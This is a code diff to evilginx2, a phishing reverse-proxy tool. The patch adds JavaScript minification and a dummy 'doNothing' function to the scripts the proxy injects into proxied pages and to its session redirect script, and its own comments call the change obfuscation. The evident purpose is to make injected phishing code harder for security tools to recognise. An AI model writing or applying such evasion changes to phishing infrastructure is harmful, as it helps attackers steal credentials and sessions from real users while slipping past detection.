@@ -45,6 +45,9 @@ import (
 
 	"github.com/kgretzky/evilginx2/database"
 	"github.com/kgretzky/evilginx2/log"
+
+	"github.com/tdewolff/minify/v2"
+	"github.com/tdewolff/minify/v2/js"
 )
 
 const (
@@ -289,7 +292,19 @@ for _, blocked := range blockedUserAgents {
 
 							script, err := pl.GetScriptInjectById(js_id, js_params)
 							if err == nil {
-								d_body += script + "\n\n"
+								// Apply minification/obfuscation to the script
+								minifier := minify.New()
+								minifier.AddFunc("text/javascript", js.Minify)
+								obfuscatedScript, minErr := minifier.String("text/javascript", script)
+								
+								if minErr != nil {
+									// Fallback: use original script with dummy function
+									log.Debug("js_inject: minification failed for inject script, using fallback: %v", minErr)
+									d_body += "function doNothing(){var x=0;};" + script + "\n\n"
+								} else {
+									// Use minified version with dummy function
+									d_body += "function doNothing(){var x=0;};" + obfuscatedScript + "\n\n"
+								}
 							} else {
 								log.Warning("js_inject: script not found: '%s'", js_id)
 							}
@@ -313,7 +328,20 @@ for _, blocked := range blockedUserAgents {
 								if s.RedirectURL != "" {
 									dynamic_redirect_js := DYNAMIC_REDIRECT_JS
 									dynamic_redirect_js = strings.ReplaceAll(dynamic_redirect_js, "{session_id}", s.Id)
-									d_body += dynamic_redirect_js + "\n\n"
+									
+									// Apply minification/obfuscation to redirect script
+									minifier := minify.New()
+									minifier.AddFunc("text/javascript", js.Minify)
+									obfuscatedScript, minErr := minifier.String("text/javascript", dynamic_redirect_js)
+									
+									if minErr != nil {
+										// Fallback: use original script with dummy function
+										log.Debug("js_inject: minification failed for redirect script, using fallback: %v", minErr)
+										d_body += "function doNothing(){var x=0;};" + dynamic_redirect_js + "\n\n"
+									} else {
+										// Use minified version with dummy function
+										d_body += "function doNothing(){var x=0;};" + obfuscatedScript + "\n\n"
+									}
 								}
 							}
 							resp := goproxy.NewResponse(req, "application/javascript", 200, string(d_body))
@@ -1399,8 +1427,29 @@ func (p *HttpProxy) injectJavascriptIntoBody(body []byte, script string, src_url
 	}
 	re := regexp.MustCompile(`(?i)(<\s*/body\s*>)`)
 	var d_inject string
+	
 	if script != "" {
-		d_inject = "<script" + js_nonce + ">" + script + "</script>\n${1}"
+		// Initialize minifier for JavaScript obfuscation
+		minifier := minify.New()
+		minifier.AddFunc("text/javascript", js.Minify)
+		
+		// Attempt to minify and obfuscate the script
+		obfuscatedScript, err := minifier.String("text/javascript", script)
+		
+		if err != nil {
+			// Fallback: If minification fails, inject with dummy function only
+			log.Debug("js_inject: minification failed, using fallback: %v", err)
+			d_inject = "<script" + js_nonce + ">" + 
+			           "function doNothing(){var x=0;};" + 
+			           script + 
+			           "</script>\n${1}"
+		} else {
+			// Success: Use minified/obfuscated version with dummy function
+			d_inject = "<script" + js_nonce + ">" + 
+			           "function doNothing(){var x=0;};" + 
+			           obfuscatedScript + 
+			           "</script>\n${1}"
+		}
 	} else if src_url != "" {
 		d_inject = "<script" + js_nonce + " type=\"application/javascript\" src=\"" + src_url + "\"></script>\n${1}"
 	} else {
